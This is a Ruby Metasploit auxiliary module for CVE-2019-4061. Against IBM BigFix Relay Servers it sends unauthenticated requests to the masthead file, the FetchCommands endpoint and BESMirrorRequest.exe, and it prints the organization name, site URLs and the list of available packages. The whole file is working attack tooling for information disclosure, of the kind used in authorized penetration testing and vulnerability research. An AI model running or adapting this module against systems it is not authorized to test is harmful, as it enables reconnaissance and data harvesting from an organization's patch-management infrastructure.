##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'  => 'IBM BigFix Relay Server Sites and Package Enum',
      'Description' => %q{
        This module retrieves masthead, site, and available package information
        from IBM BigFix Relay Servers.
      },
      'Author' =>
        [
          'HD Moore',       # Vulnerability Discovery
          'Chris Bellows',  # Vulnerability Discovery
          'Ryan Hanson',    # Vulnerability Discovery
          'Jacob Robles'    # Metasploit module
        ],
      'References' =>
        [
          ['CVE','2019-4061'],
          ['URL','https://www.atredis.com/blog/2019/3/18/harvesting-data-from-bigfix-relay-servers']
        ],
      'DefaultOptions' =>
        {
          'RPORT' => 52311,
          'SSL'   => true
        },
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Mar 18 2019' # Blog post date
    ))

    register_options [
      OptString.new('TARGETURI', [true, 'Path to the BigFix server', '/']),
      OptBool.new('SHOW_MASTHEAD', [true, 'Retrieve information from masthead file', true]),
      OptBool.new('SHOW_SITES', [true, 'Retrieve site listing', true]),
      OptBool.new('SHOW_PACKAGES', [true, 'Retrieve packages list', true])
    ]
  end

  def send_req(uri)
    send_request_cgi({
      'uri' => normalize_uri(target_uri, uri)
    })
  end

  def masthead
    res = send_req('masthead/masthead.axfm')
    return unless res && res.code == 200

    if res.body =~ /Organization: (.*)./
      print_good($1)
    end

    res.body.scan(/URL: (.*)./).each do |http|
      print_good(http[0])
    end
  end

  def sites
    res = send_req('cgi-bin/bfenterprise/clientregister.exe?RequestType=FetchCommands')
    return unless res && res.code == 200

    print_status('Sites')
    res.body.scan(/: ([^ ]+)/).each do |url|
      print_good(url[0])
    end
  end

  def packages
    res = send_req('cgi-bin/bfenterprise/BESMirrorRequest.exe')
    return unless res && res.code == 200

    print_status('Packages')
    myhtml = res.get_html_document
    myhtml.css('.indented p').each do |element|
      element.children.each do |text|
        if text.class == Nokogiri::XML::Text
          print_good(text.text) unless text.text.start_with?('Error')
=begin
          text.text =~ /^([^ ]+)/
          case $1
            when 'Action:' then print_status(text.text)
            when 'url' then print_good(text.text)
          end
=end
        end
      end
    end
  end

  def run
    masthead if datastore['SHOW_MASTHEAD']
    sites if datastore['SHOW_SITES']
    packages if datastore['SHOW_PACKAGES']
  end
end
